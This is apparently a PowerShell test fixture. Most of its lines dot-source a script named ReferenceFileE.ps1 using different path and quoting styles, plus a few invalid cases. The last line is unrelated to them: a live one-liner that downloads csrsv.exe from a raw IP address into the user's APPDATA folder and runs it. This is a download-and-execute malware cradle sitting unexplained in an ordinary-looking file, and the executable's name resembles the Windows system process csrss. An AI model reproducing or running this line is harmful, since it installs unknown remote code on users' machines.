. ./ReferenceFileE.ps1
. "$PSScriptRoot/ReferenceFileE.ps1"
. "${PSScriptRoot}/ReferenceFileE.ps1"
. './ReferenceFileE.ps1'
. "./ReferenceFileE.ps1"
. .\ReferenceFileE.ps1
. '.\ReferenceFileE.ps1'
. ".\ReferenceFileE.ps1"
. ReferenceFileE.ps1
. 'ReferenceFileE.ps1'
. "ReferenceFileE.ps1"
. ./dir/../ReferenceFileE.ps1
. ./invalidfile.ps1
. ""
. $someVar

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

